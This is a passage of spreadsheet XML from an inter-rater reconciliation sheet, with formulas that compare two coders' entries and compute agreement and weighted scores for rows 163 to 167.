        <f>IF(AND(Coder1!AB163&amp;""&lt;&gt;"",Coder1!AB163&amp;""=Coder2!AB163&amp;""),Coder1!AB163,"")</f>
        <v/>
      </c>
      <c r="AC163" s="14">
        <f>IF(AND(Coder1!AC163&amp;""&lt;&gt;"",Coder1!AC163&amp;""=Coder2!AC163&amp;""),Coder1!AC163,"")</f>
        <v/>
      </c>
      <c r="AD163" s="14">
        <f>IF(AND(Coder1!AD163&amp;""&lt;&gt;"",Coder1!AD163&amp;""=Coder2!AD163&amp;""),Coder1!AD163,"")</f>
        <v/>
      </c>
      <c r="AE163" s="14">
        <f>IF(AND(Coder1!AE163&amp;""&lt;&gt;"",Coder1!AE163&amp;""=Coder2!AE163&amp;""),Coder1!AE163,"")</f>
        <v/>
      </c>
      <c r="AF163" s="14">
        <f>IF(AND(Coder1!AF163&amp;""&lt;&gt;"",Coder1!AF163&amp;""=Coder2!AF163&amp;""),Coder1!AF163,"")</f>
        <v/>
      </c>
      <c r="AG163" s="14">
        <f>IF(AND(Coder1!AG163&amp;""&lt;&gt;"",Coder1!AG163&amp;""=Coder2!AG163&amp;""),Coder1!AG163,"")</f>
        <v/>
      </c>
      <c r="AH163" s="14">
        <f>IF(AND(Coder1!AH163&amp;""&lt;&gt;"",Coder1!AH163&amp;""=Coder2!AH163&amp;""),Coder1!AH163,"")</f>
        <v/>
      </c>
      <c r="AI163" s="11">
        <f>IF(COUNT(E163:L163)=0,"",SUM(E163:L163))</f>
        <v/>
      </c>
      <c r="AJ163" s="11">
        <f>IF(AI163="","",N(E163)*3+N(F163)*2+N(G163)*2+N(H163)*2+N(I163)*2+N(J163)*3+N(K163)*3+N(L163)*3)</f>
        <v/>
      </c>
      <c r="AK163" s="11">
        <f>IF(AI163="","",COUNTIF(N163:AG163,1))</f>
        <v/>
      </c>
      <c r="AL163" s="11">
        <f>IF(OR(AJ163="",AJ163=0),"",ROUND(100*(AJ163-AK163)/AJ163,1))</f>
        <v/>
      </c>
      <c r="AM163" s="11">
        <f>IF(AND(Coder1!AN163=1,Coder2!AN163=1),IF(COUNTBLANK(E163:AH163)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN163" s="11">
        <f>IF(AND(Coder1!AN163=1,Coder2!AN163=1),IF(SUMPRODUCT(--(Coder1!E163:AH163&amp;""&lt;&gt;Coder2!E163:AH163&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO163" s="11" t="n"/>
    </row>
    <row r="164">
      <c r="A164" s="11">
        <f>Coder1!A164</f>
        <v/>
      </c>
      <c r="B164" s="11">
        <f>Coder1!B164</f>
        <v/>
      </c>
      <c r="C164" s="11">
        <f>Coder1!C164</f>
        <v/>
      </c>
      <c r="D164" s="11">
        <f>Coder1!D164</f>
        <v/>
      </c>
      <c r="E164" s="14">
        <f>IF(AND(Coder1!E164&amp;""&lt;&gt;"",Coder1!E164&amp;""=Coder2!E164&amp;""),Coder1!E164,"")</f>
        <v/>
      </c>
      <c r="F164" s="14">
        <f>IF(AND(Coder1!F164&amp;""&lt;&gt;"",Coder1!F164&amp;""=Coder2!F164&amp;""),Coder1!F164,"")</f>
        <v/>
      </c>
      <c r="G164" s="14">
        <f>IF(AND(Coder1!G164&amp;""&lt;&gt;"",Coder1!G164&amp;""=Coder2!G164&amp;""),Coder1!G164,"")</f>
        <v/>
      </c>
      <c r="H164" s="14">
        <f>IF(AND(Coder1!H164&amp;""&lt;&gt;"",Coder1!H164&amp;""=Coder2!H164&amp;""),Coder1!H164,"")</f>
        <v/>
      </c>
      <c r="I164" s="14">
        <f>IF(AND(Coder1!I164&amp;""&lt;&gt;"",Coder1!I164&amp;""=Coder2!I164&amp;""),Coder1!I164,"")</f>
        <v/>
      </c>
      <c r="J164" s="14">
        <f>IF(AND(Coder1!J164&amp;""&lt;&gt;"",Coder1!J164&amp;""=Coder2!J164&amp;""),Coder1!J164,"")</f>
        <v/>
      </c>
      <c r="K164" s="14">
        <f>IF(AND(Coder1!K164&amp;""&lt;&gt;"",Coder1!K164&amp;""=Coder2!K164&amp;""),Coder1!K164,"")</f>
        <v/>
      </c>
      <c r="L164" s="14">
        <f>IF(AND(Coder1!L164&amp;""&lt;&gt;"",Coder1!L164&amp;""=Coder2!L164&amp;""),Coder1!L164,"")</f>
        <v/>
      </c>
      <c r="M164" s="14">
        <f>IF(AND(Coder1!M164&amp;""&lt;&gt;"",Coder1!M164&amp;""=Coder2!M164&amp;""),Coder1!M164,"")</f>
        <v/>
      </c>
      <c r="N164" s="14">
        <f>IF(AND(Coder1!N164&amp;""&lt;&gt;"",Coder1!N164&amp;""=Coder2!N164&amp;""),Coder1!N164,"")</f>
        <v/>
      </c>
      <c r="O164" s="14">
        <f>IF(AND(Coder1!O164&amp;""&lt;&gt;"",Coder1!O164&amp;""=Coder2!O164&amp;""),Coder1!O164,"")</f>
        <v/>
      </c>
      <c r="P164" s="14">
        <f>IF(AND(Coder1!P164&amp;""&lt;&gt;"",Coder1!P164&amp;""=Coder2!P164&amp;""),Coder1!P164,"")</f>
        <v/>
      </c>
      <c r="Q164" s="14">
        <f>IF(AND(Coder1!Q164&amp;""&lt;&gt;"",Coder1!Q164&amp;""=Coder2!Q164&amp;""),Coder1!Q164,"")</f>
        <v/>
      </c>
      <c r="R164" s="14">
        <f>IF(AND(Coder1!R164&amp;""&lt;&gt;"",Coder1!R164&amp;""=Coder2!R164&amp;""),Coder1!R164,"")</f>
        <v/>
      </c>
      <c r="S164" s="14">
        <f>IF(AND(Coder1!S164&amp;""&lt;&gt;"",Coder1!S164&amp;""=Coder2!S164&amp;""),Coder1!S164,"")</f>
        <v/>
      </c>
      <c r="T164" s="14">
        <f>IF(AND(Coder1!T164&amp;""&lt;&gt;"",Coder1!T164&amp;""=Coder2!T164&amp;""),Coder1!T164,"")</f>
        <v/>
      </c>
      <c r="U164" s="14">
        <f>IF(AND(Coder1!U164&amp;""&lt;&gt;"",Coder1!U164&amp;""=Coder2!U164&amp;""),Coder1!U164,"")</f>
        <v/>
      </c>
      <c r="V164" s="14">
        <f>IF(AND(Coder1!V164&amp;""&lt;&gt;"",Coder1!V164&amp;""=Coder2!V164&amp;""),Coder1!V164,"")</f>
        <v/>
      </c>
      <c r="W164" s="14">
        <f>IF(AND(Coder1!W164&amp;""&lt;&gt;"",Coder1!W164&amp;""=Coder2!W164&amp;""),Coder1!W164,"")</f>
        <v/>
      </c>
      <c r="X164" s="14">
        <f>IF(AND(Coder1!X164&amp;""&lt;&gt;"",Coder1!X164&amp;""=Coder2!X164&amp;""),Coder1!X164,"")</f>
        <v/>
      </c>
      <c r="Y164" s="14">
        <f>IF(AND(Coder1!Y164&amp;""&lt;&gt;"",Coder1!Y164&amp;""=Coder2!Y164&amp;""),Coder1!Y164,"")</f>
        <v/>
      </c>
      <c r="Z164" s="14">
        <f>IF(AND(Coder1!Z164&amp;""&lt;&gt;"",Coder1!Z164&amp;""=Coder2!Z164&amp;""),Coder1!Z164,"")</f>
        <v/>
      </c>
      <c r="AA164" s="14">
        <f>IF(AND(Coder1!AA164&amp;""&lt;&gt;"",Coder1!AA164&amp;""=Coder2!AA164&amp;""),Coder1!AA164,"")</f>
        <v/>
      </c>
      <c r="AB164" s="14">
        <f>IF(AND(Coder1!AB164&amp;""&lt;&gt;"",Coder1!AB164&amp;""=Coder2!AB164&amp;""),Coder1!AB164,"")</f>
        <v/>
      </c>
      <c r="AC164" s="14">
        <f>IF(AND(Coder1!AC164&amp;""&lt;&gt;"",Coder1!AC164&amp;""=Coder2!AC164&amp;""),Coder1!AC164,"")</f>
        <v/>
      </c>
      <c r="AD164" s="14">
        <f>IF(AND(Coder1!AD164&amp;""&lt;&gt;"",Coder1!AD164&amp;""=Coder2!AD164&amp;""),Coder1!AD164,"")</f>
        <v/>
      </c>
      <c r="AE164" s="14">
        <f>IF(AND(Coder1!AE164&amp;""&lt;&gt;"",Coder1!AE164&amp;""=Coder2!AE164&amp;""),Coder1!AE164,"")</f>
        <v/>
      </c>
      <c r="AF164" s="14">
        <f>IF(AND(Coder1!AF164&amp;""&lt;&gt;"",Coder1!AF164&amp;""=Coder2!AF164&amp;""),Coder1!AF164,"")</f>
        <v/>
      </c>
      <c r="AG164" s="14">
        <f>IF(AND(Coder1!AG164&amp;""&lt;&gt;"",Coder1!AG164&amp;""=Coder2!AG164&amp;""),Coder1!AG164,"")</f>
        <v/>
      </c>
      <c r="AH164" s="14">
        <f>IF(AND(Coder1!AH164&amp;""&lt;&gt;"",Coder1!AH164&amp;""=Coder2!AH164&amp;""),Coder1!AH164,"")</f>
        <v/>
      </c>
      <c r="AI164" s="11">
        <f>IF(COUNT(E164:L164)=0,"",SUM(E164:L164))</f>
        <v/>
      </c>
      <c r="AJ164" s="11">
        <f>IF(AI164="","",N(E164)*3+N(F164)*2+N(G164)*2+N(H164)*2+N(I164)*2+N(J164)*3+N(K164)*3+N(L164)*3)</f>
        <v/>
      </c>
      <c r="AK164" s="11">
        <f>IF(AI164="","",COUNTIF(N164:AG164,1))</f>
        <v/>
      </c>
      <c r="AL164" s="11">
        <f>IF(OR(AJ164="",AJ164=0),"",ROUND(100*(AJ164-AK164)/AJ164,1))</f>
        <v/>
      </c>
      <c r="AM164" s="11">
        <f>IF(AND(Coder1!AN164=1,Coder2!AN164=1),IF(COUNTBLANK(E164:AH164)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN164" s="11">
        <f>IF(AND(Coder1!AN164=1,Coder2!AN164=1),IF(SUMPRODUCT(--(Coder1!E164:AH164&amp;""&lt;&gt;Coder2!E164:AH164&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO164" s="11" t="n"/>
    </row>
    <row r="165">
      <c r="A165" s="11">
        <f>Coder1!A165</f>
        <v/>
      </c>
      <c r="B165" s="11">
        <f>Coder1!B165</f>
        <v/>
      </c>
      <c r="C165" s="11">
        <f>Coder1!C165</f>
        <v/>
      </c>
      <c r="D165" s="11">
        <f>Coder1!D165</f>
        <v/>
      </c>
      <c r="E165" s="14">
        <f>IF(AND(Coder1!E165&amp;""&lt;&gt;"",Coder1!E165&amp;""=Coder2!E165&amp;""),Coder1!E165,"")</f>
        <v/>
      </c>
      <c r="F165" s="14">
        <f>IF(AND(Coder1!F165&amp;""&lt;&gt;"",Coder1!F165&amp;""=Coder2!F165&amp;""),Coder1!F165,"")</f>
        <v/>
      </c>
      <c r="G165" s="14">
        <f>IF(AND(Coder1!G165&amp;""&lt;&gt;"",Coder1!G165&amp;""=Coder2!G165&amp;""),Coder1!G165,"")</f>
        <v/>
      </c>
      <c r="H165" s="14">
        <f>IF(AND(Coder1!H165&amp;""&lt;&gt;"",Coder1!H165&amp;""=Coder2!H165&amp;""),Coder1!H165,"")</f>
        <v/>
      </c>
      <c r="I165" s="14">
        <f>IF(AND(Coder1!I165&amp;""&lt;&gt;"",Coder1!I165&amp;""=Coder2!I165&amp;""),Coder1!I165,"")</f>
        <v/>
      </c>
      <c r="J165" s="14">
        <f>IF(AND(Coder1!J165&amp;""&lt;&gt;"",Coder1!J165&amp;""=Coder2!J165&amp;""),Coder1!J165,"")</f>
        <v/>
      </c>
      <c r="K165" s="14">
        <f>IF(AND(Coder1!K165&amp;""&lt;&gt;"",Coder1!K165&amp;""=Coder2!K165&amp;""),Coder1!K165,"")</f>
        <v/>
      </c>
      <c r="L165" s="14">
        <f>IF(AND(Coder1!L165&amp;""&lt;&gt;"",Coder1!L165&amp;""=Coder2!L165&amp;""),Coder1!L165,"")</f>
        <v/>
      </c>
      <c r="M165" s="14">
        <f>IF(AND(Coder1!M165&amp;""&lt;&gt;"",Coder1!M165&amp;""=Coder2!M165&amp;""),Coder1!M165,"")</f>
        <v/>
      </c>
      <c r="N165" s="14">
        <f>IF(AND(Coder1!N165&amp;""&lt;&gt;"",Coder1!N165&amp;""=Coder2!N165&amp;""),Coder1!N165,"")</f>
        <v/>
      </c>
      <c r="O165" s="14">
        <f>IF(AND(Coder1!O165&amp;""&lt;&gt;"",Coder1!O165&amp;""=Coder2!O165&amp;""),Coder1!O165,"")</f>
        <v/>
      </c>
      <c r="P165" s="14">
        <f>IF(AND(Coder1!P165&amp;""&lt;&gt;"",Coder1!P165&amp;""=Coder2!P165&amp;""),Coder1!P165,"")</f>
        <v/>
      </c>
      <c r="Q165" s="14">
        <f>IF(AND(Coder1!Q165&amp;""&lt;&gt;"",Coder1!Q165&amp;""=Coder2!Q165&amp;""),Coder1!Q165,"")</f>
        <v/>
      </c>
      <c r="R165" s="14">
        <f>IF(AND(Coder1!R165&amp;""&lt;&gt;"",Coder1!R165&amp;""=Coder2!R165&amp;""),Coder1!R165,"")</f>
        <v/>
      </c>
      <c r="S165" s="14">
        <f>IF(AND(Coder1!S165&amp;""&lt;&gt;"",Coder1!S165&amp;""=Coder2!S165&amp;""),Coder1!S165,"")</f>
        <v/>
      </c>
      <c r="T165" s="14">
        <f>IF(AND(Coder1!T165&amp;""&lt;&gt;"",Coder1!T165&amp;""=Coder2!T165&amp;""),Coder1!T165,"")</f>
        <v/>
      </c>
      <c r="U165" s="14">
        <f>IF(AND(Coder1!U165&amp;""&lt;&gt;"",Coder1!U165&amp;""=Coder2!U165&amp;""),Coder1!U165,"")</f>
        <v/>
      </c>
      <c r="V165" s="14">
        <f>IF(AND(Coder1!V165&amp;""&lt;&gt;"",Coder1!V165&amp;""=Coder2!V165&amp;""),Coder1!V165,"")</f>
        <v/>
      </c>
      <c r="W165" s="14">
        <f>IF(AND(Coder1!W165&amp;""&lt;&gt;"",Coder1!W165&amp;""=Coder2!W165&amp;""),Coder1!W165,"")</f>
        <v/>
      </c>
      <c r="X165" s="14">
        <f>IF(AND(Coder1!X165&amp;""&lt;&gt;"",Coder1!X165&amp;""=Coder2!X165&amp;""),Coder1!X165,"")</f>
        <v/>
      </c>
      <c r="Y165" s="14">
        <f>IF(AND(Coder1!Y165&amp;""&lt;&gt;"",Coder1!Y165&amp;""=Coder2!Y165&amp;""),Coder1!Y165,"")</f>
        <v/>
      </c>
      <c r="Z165" s="14">
        <f>IF(AND(Coder1!Z165&amp;""&lt;&gt;"",Coder1!Z165&amp;""=Coder2!Z165&amp;""),Coder1!Z165,"")</f>
        <v/>
      </c>
      <c r="AA165" s="14">
        <f>IF(AND(Coder1!AA165&amp;""&lt;&gt;"",Coder1!AA165&amp;""=Coder2!AA165&amp;""),Coder1!AA165,"")</f>
        <v/>
      </c>
      <c r="AB165" s="14">
        <f>IF(AND(Coder1!AB165&amp;""&lt;&gt;"",Coder1!AB165&amp;""=Coder2!AB165&amp;""),Coder1!AB165,"")</f>
        <v/>
      </c>
      <c r="AC165" s="14">
        <f>IF(AND(Coder1!AC165&amp;""&lt;&gt;"",Coder1!AC165&amp;""=Coder2!AC165&amp;""),Coder1!AC165,"")</f>
        <v/>
      </c>
      <c r="AD165" s="14">
        <f>IF(AND(Coder1!AD165&amp;""&lt;&gt;"",Coder1!AD165&amp;""=Coder2!AD165&amp;""),Coder1!AD165,"")</f>
        <v/>
      </c>
      <c r="AE165" s="14">
        <f>IF(AND(Coder1!AE165&amp;""&lt;&gt;"",Coder1!AE165&amp;""=Coder2!AE165&amp;""),Coder1!AE165,"")</f>
        <v/>
      </c>
      <c r="AF165" s="14">
        <f>IF(AND(Coder1!AF165&amp;""&lt;&gt;"",Coder1!AF165&amp;""=Coder2!AF165&amp;""),Coder1!AF165,"")</f>
        <v/>
      </c>
      <c r="AG165" s="14">
        <f>IF(AND(Coder1!AG165&amp;""&lt;&gt;"",Coder1!AG165&amp;""=Coder2!AG165&amp;""),Coder1!AG165,"")</f>
        <v/>
      </c>
      <c r="AH165" s="14">
        <f>IF(AND(Coder1!AH165&amp;""&lt;&gt;"",Coder1!AH165&amp;""=Coder2!AH165&amp;""),Coder1!AH165,"")</f>
        <v/>
      </c>
      <c r="AI165" s="11">
        <f>IF(COUNT(E165:L165)=0,"",SUM(E165:L165))</f>
        <v/>
      </c>
      <c r="AJ165" s="11">
        <f>IF(AI165="","",N(E165)*3+N(F165)*2+N(G165)*2+N(H165)*2+N(I165)*2+N(J165)*3+N(K165)*3+N(L165)*3)</f>
        <v/>
      </c>
      <c r="AK165" s="11">
        <f>IF(AI165="","",COUNTIF(N165:AG165,1))</f>
        <v/>
      </c>
      <c r="AL165" s="11">
        <f>IF(OR(AJ165="",AJ165=0),"",ROUND(100*(AJ165-AK165)/AJ165,1))</f>
        <v/>
      </c>
      <c r="AM165" s="11">
        <f>IF(AND(Coder1!AN165=1,Coder2!AN165=1),IF(COUNTBLANK(E165:AH165)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN165" s="11">
        <f>IF(AND(Coder1!AN165=1,Coder2!AN165=1),IF(SUMPRODUCT(--(Coder1!E165:AH165&amp;""&lt;&gt;Coder2!E165:AH165&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO165" s="11" t="n"/>
    </row>
    <row r="166">
      <c r="A166" s="11">
        <f>Coder1!A166</f>
        <v/>
      </c>
      <c r="B166" s="11">
        <f>Coder1!B166</f>
        <v/>
      </c>
      <c r="C166" s="11">
        <f>Coder1!C166</f>
        <v/>
      </c>
      <c r="D166" s="11">
        <f>Coder1!D166</f>
        <v/>
      </c>
      <c r="E166" s="14">
        <f>IF(AND(Coder1!E166&amp;""&lt;&gt;"",Coder1!E166&amp;""=Coder2!E166&amp;""),Coder1!E166,"")</f>
        <v/>
      </c>
      <c r="F166" s="14">
        <f>IF(AND(Coder1!F166&amp;""&lt;&gt;"",Coder1!F166&amp;""=Coder2!F166&amp;""),Coder1!F166,"")</f>
        <v/>
      </c>
      <c r="G166" s="14">
        <f>IF(AND(Coder1!G166&amp;""&lt;&gt;"",Coder1!G166&amp;""=Coder2!G166&amp;""),Coder1!G166,"")</f>
        <v/>
      </c>
      <c r="H166" s="14">
        <f>IF(AND(Coder1!H166&amp;""&lt;&gt;"",Coder1!H166&amp;""=Coder2!H166&amp;""),Coder1!H166,"")</f>
        <v/>
      </c>
      <c r="I166" s="14">
        <f>IF(AND(Coder1!I166&amp;""&lt;&gt;"",Coder1!I166&amp;""=Coder2!I166&amp;""),Coder1!I166,"")</f>
        <v/>
      </c>
      <c r="J166" s="14">
        <f>IF(AND(Coder1!J166&amp;""&lt;&gt;"",Coder1!J166&amp;""=Coder2!J166&amp;""),Coder1!J166,"")</f>
        <v/>
      </c>
      <c r="K166" s="14">
        <f>IF(AND(Coder1!K166&amp;""&lt;&gt;"",Coder1!K166&amp;""=Coder2!K166&amp;""),Coder1!K166,"")</f>
        <v/>
      </c>
      <c r="L166" s="14">
        <f>IF(AND(Coder1!L166&amp;""&lt;&gt;"",Coder1!L166&amp;""=Coder2!L166&amp;""),Coder1!L166,"")</f>
        <v/>
      </c>
      <c r="M166" s="14">
        <f>IF(AND(Coder1!M166&amp;""&lt;&gt;"",Coder1!M166&amp;""=Coder2!M166&amp;""),Coder1!M166,"")</f>
        <v/>
      </c>
      <c r="N166" s="14">
        <f>IF(AND(Coder1!N166&amp;""&lt;&gt;"",Coder1!N166&amp;""=Coder2!N166&amp;""),Coder1!N166,"")</f>
        <v/>
      </c>
      <c r="O166" s="14">
        <f>IF(AND(Coder1!O166&amp;""&lt;&gt;"",Coder1!O166&amp;""=Coder2!O166&amp;""),Coder1!O166,"")</f>
        <v/>
      </c>
      <c r="P166" s="14">
        <f>IF(AND(Coder1!P166&amp;""&lt;&gt;"",Coder1!P166&amp;""=Coder2!P166&amp;""),Coder1!P166,"")</f>
        <v/>
      </c>
      <c r="Q166" s="14">
        <f>IF(AND(Coder1!Q166&amp;""&lt;&gt;"",Coder1!Q166&amp;""=Coder2!Q166&amp;""),Coder1!Q166,"")</f>
        <v/>
      </c>
      <c r="R166" s="14">
        <f>IF(AND(Coder1!R166&amp;""&lt;&gt;"",Coder1!R166&amp;""=Coder2!R166&amp;""),Coder1!R166,"")</f>
        <v/>
      </c>
      <c r="S166" s="14">
        <f>IF(AND(Coder1!S166&amp;""&lt;&gt;"",Coder1!S166&amp;""=Coder2!S166&amp;""),Coder1!S166,"")</f>
        <v/>
      </c>
      <c r="T166" s="14">
        <f>IF(AND(Coder1!T166&amp;""&lt;&gt;"",Coder1!T166&amp;""=Coder2!T166&amp;""),Coder1!T166,"")</f>
        <v/>
      </c>
      <c r="U166" s="14">
        <f>IF(AND(Coder1!U166&amp;""&lt;&gt;"",Coder1!U166&amp;""=Coder2!U166&amp;""),Coder1!U166,"")</f>
        <v/>
      </c>
      <c r="V166" s="14">
        <f>IF(AND(Coder1!V166&amp;""&lt;&gt;"",Coder1!V166&amp;""=Coder2!V166&amp;""),Coder1!V166,"")</f>
        <v/>
      </c>
      <c r="W166" s="14">
        <f>IF(AND(Coder1!W166&amp;""&lt;&gt;"",Coder1!W166&amp;""=Coder2!W166&amp;""),Coder1!W166,"")</f>
        <v/>
      </c>
      <c r="X166" s="14">
        <f>IF(AND(Coder1!X166&amp;""&lt;&gt;"",Coder1!X166&amp;""=Coder2!X166&amp;""),Coder1!X166,"")</f>
        <v/>
      </c>
      <c r="Y166" s="14">
        <f>IF(AND(Coder1!Y166&amp;""&lt;&gt;"",Coder1!Y166&amp;""=Coder2!Y166&amp;""),Coder1!Y166,"")</f>
        <v/>
      </c>
      <c r="Z166" s="14">
        <f>IF(AND(Coder1!Z166&amp;""&lt;&gt;"",Coder1!Z166&amp;""=Coder2!Z166&amp;""),Coder1!Z166,"")</f>
        <v/>
      </c>
      <c r="AA166" s="14">
        <f>IF(AND(Coder1!AA166&amp;""&lt;&gt;"",Coder1!AA166&amp;""=Coder2!AA166&amp;""),Coder1!AA166,"")</f>
        <v/>
      </c>
      <c r="AB166" s="14">
        <f>IF(AND(Coder1!AB166&amp;""&lt;&gt;"",Coder1!AB166&amp;""=Coder2!AB166&amp;""),Coder1!AB166,"")</f>
        <v/>
      </c>
      <c r="AC166" s="14">
        <f>IF(AND(Coder1!AC166&amp;""&lt;&gt;"",Coder1!AC166&amp;""=Coder2!AC166&amp;""),Coder1!AC166,"")</f>
        <v/>
      </c>
      <c r="AD166" s="14">
        <f>IF(AND(Coder1!AD166&amp;""&lt;&gt;"",Coder1!AD166&amp;""=Coder2!AD166&amp;""),Coder1!AD166,"")</f>
        <v/>
      </c>
      <c r="AE166" s="14">
        <f>IF(AND(Coder1!AE166&amp;""&lt;&gt;"",Coder1!AE166&amp;""=Coder2!AE166&amp;""),Coder1!AE166,"")</f>
        <v/>
      </c>
      <c r="AF166" s="14">
        <f>IF(AND(Coder1!AF166&amp;""&lt;&gt;"",Coder1!AF166&amp;""=Coder2!AF166&amp;""),Coder1!AF166,"")</f>
        <v/>
      </c>
      <c r="AG166" s="14">
        <f>IF(AND(Coder1!AG166&amp;""&lt;&gt;"",Coder1!AG166&amp;""=Coder2!AG166&amp;""),Coder1!AG166,"")</f>
        <v/>
      </c>
      <c r="AH166" s="14">
        <f>IF(AND(Coder1!AH166&amp;""&lt;&gt;"",Coder1!AH166&amp;""=Coder2!AH166&amp;""),Coder1!AH166,"")</f>
        <v/>
      </c>
      <c r="AI166" s="11">
        <f>IF(COUNT(E166:L166)=0,"",SUM(E166:L166))</f>
        <v/>
      </c>
      <c r="AJ166" s="11">
        <f>IF(AI166="","",N(E166)*3+N(F166)*2+N(G166)*2+N(H166)*2+N(I166)*2+N(J166)*3+N(K166)*3+N(L166)*3)</f>
        <v/>
      </c>
      <c r="AK166" s="11">
        <f>IF(AI166="","",COUNTIF(N166:AG166,1))</f>
        <v/>
      </c>
      <c r="AL166" s="11">
        <f>IF(OR(AJ166="",AJ166=0),"",ROUND(100*(AJ166-AK166)/AJ166,1))</f>
        <v/>
      </c>
      <c r="AM166" s="11">
        <f>IF(AND(Coder1!AN166=1,Coder2!AN166=1),IF(COUNTBLANK(E166:AH166)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN166" s="11">
        <f>IF(AND(Coder1!AN166=1,Coder2!AN166=1),IF(SUMPRODUCT(--(Coder1!E166:AH166&amp;""&lt;&gt;Coder2!E166:AH166&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO166" s="11" t="n"/>
    </row>
    <row r="167">
      <c r="A167" s="11">
        <f>Coder1!A167</f>
        <v/>
      </c>
      <c r="B167" s="11">
        <f>Coder1!B167</f>
        <v/>
      </c>
      <c r="C167" s="11">
        <f>Coder1!C167</f>
        <v/>
      </c>
      <c r="D167" s="11">
        <f>Coder1!D167</f>
        <v/>
      </c>
      <c r="E167" s="14">
        <f>IF(AND(Coder1!E167&amp;""&lt;&gt;"",Coder1!E167&amp;""=Coder2!E167&amp;""),Coder1!E167,"")</f>
        <v/>
      </c>
      <c r="F167" s="14">
        <f>IF(AND(Coder1!F167&amp;""&lt;&gt;"",Coder1!F167&amp;""=Coder2!F167&amp;""),Coder1!F167,"")</f>
        <v/>
      </c>
      <c r="G167" s="14">
        <f>IF(AND(Coder1!G167&amp;""&lt;&gt;"",Coder1!G167&amp;""=Coder2!G167&amp;""),Coder1!G167,"")</f>
        <v/>
      </c>
      <c r="H167" s="14">
        <f>IF(AND(Coder1!H167&amp;""&lt;&gt;"",Coder1!H167&amp;""=Coder2!H167&amp;""),Coder1!H167,"")</f>
        <v/>
      </c>
      <c r="I167" s="14">
        <f>IF(AND(Coder1!I167&amp;""&lt;&gt;"",Coder1!I167&amp;""=Coder2!I167&amp;""),Coder1!I167,"")</f>
        <v/>
      </c>
      <c r="J167" s="14">
        <f>IF(AND(Coder1!J167&amp;""&lt;&gt;"",Coder1!J167&amp;""=Coder2!J167&amp;""),Coder1!J167,"")</f>
        <v/>
      </c>
      <c r="K167" s="14">
        <f>IF(AND(Coder1!K167&amp;""&lt;&gt;"",Coder1!K167&amp;""=Coder2!K167&amp;""),Coder1!K167,"")</f>
        <v/>
      </c>
      <c r="L167" s="14">
        <f>IF(AND(Coder1!L167&amp;""&lt;&gt;"",Coder1!L167&amp;""=Coder2!L167&amp;""),Coder1!L167,"")</f>
        <v/>
      </c>
      <c r="M167" s="14">
        <f>IF(AND(Coder1!M167&amp;""&lt;&gt;"",Coder1!M167&amp;""=Coder2!M167&amp;""),Coder1!M167,"")</f>
        <v/>
      </c>
      <c r="N167" s="14">
        <f>IF(AND(Coder1!N167&amp;""&lt;&gt;"",Coder1!N167&amp;""=Coder2!N167&amp;""),Coder1!N167,"")</f>
        <v/>
      </c>
      <c r="O167" s="14">
        <f>IF(AND(Coder1!O167&amp;""&lt;&gt;"",Coder1!O167&amp;""=Coder2!O167&amp;""),Coder1!O167,"")</f>
        <v/>
      </c>
      <c r="P167" s="14">
        <f>IF(AND(Coder1!P167&amp;""&lt;&gt;"",Coder1!P167&amp;""=Coder2!P167&amp;""),Coder1!P167,"")</f>
        <v/>
      </c>
      <c r="Q167" s="14">
        <f>IF(AND(Coder1!Q167&amp;""&lt;&gt;"",Coder1!Q167&amp;""=Coder2!Q167&amp;""),Coder1!Q167,"")</f>
        <v/>
      </c>
      <c r="R167" s="14">
        <f>IF(AND(Coder1!R167&amp;""&lt;&gt;"",Coder1!R167&amp;""=Coder2!R167&amp;""),Coder1!R167,"")</f>
        <v/>
      </c>
      <c r="S167" s="14">
        <f>IF(AND(Coder1!S167&amp;""&lt;&gt;"",Coder1!S167&amp;""=Coder2!S167&amp;""),Coder1!S167,"")</f>
        <v/>
      </c>
      <c r="T167" s="14">
        <f>IF(AND(Coder1!T167&amp;""&lt;&gt;"",Coder1!T167&amp;""=Coder2!T167&amp;""),Coder1!T167,"")</f>
        <v/>
      </c>
      <c r="U167" s="14">
        <f>IF(AND(Coder1!U167&amp;""&lt;&gt;"",Coder1!U167&amp;""=Coder2!U167&amp;""),Coder1!U167,"")</f>
        <v/>
      </c>
      <c r="V167" s="14">
        <f>IF(AND(Coder1!V167&amp;""&lt;&gt;"",Coder1!V167&amp;""=Coder2!V167&amp;""),Coder1!V167,"")</f>
        <v/>
      </c>
      <c r="W167" s="14">
        <f>IF(AND(Coder1!W167&amp;""&lt;&gt;"",Coder1!W167&amp;""=Coder2!W167&amp;""),Coder1!W167,"")</f>
        <v/>
      </c>
      <c r="X167" s="14">
        <f>IF(AND(Coder1!X167&amp;""&lt;&gt;"",Coder1!X167&amp;""=Coder2!X167&amp;""),Coder1!X167,"")</f>
        <v/>
      </c>
      <c r="Y167" s="14">
        <f>IF(AND(Coder1!Y167&amp;""&lt;&gt;"",Coder1!Y167&amp;""=Coder2!Y167&amp;""),Coder1!Y167,"")</f>
        <v/>
      </c>
      <c r="Z167" s="14">
        <f>IF(AND(Coder1!Z167&amp;""&lt;&gt;"",Coder1!Z167&amp;""=Coder2!Z167&amp;""),Coder1!Z167,"")</f>
        <v/>
      </c>
      <c r="AA167" s="14">
        <f>IF(AND(Coder1!AA167&amp;""&lt;&gt;"",Coder1!AA167&amp;""=Coder2!AA167&amp;""),Coder1!AA167,"")</f>
        <v/>
      </c>
      <c r="AB167" s="14">
        <f>IF(AND(Coder1!AB167&amp;""&lt;&gt;"",Coder1!AB167&amp;""=Coder2!AB167&amp;""),Coder1!AB167,"")</f>
        <v/>
      </c>
      <c r="AC167" s="14">
        <f>IF(AND(Coder1!AC167&amp;""&lt;&gt;"",Coder1!AC167&amp;""=Coder2!AC167&amp;""),Coder1!AC167,"")</f>
        <v/>
      </c>
      <c r="AD167" s="14">
        <f>IF(AND(Coder1!AD167&amp;""&lt;&gt;"",Coder1!AD167&amp;""=Coder2!AD167&amp;""),Coder1!AD167,"")</f>
        <v/>
      </c>
      <c r="AE167" s="14">
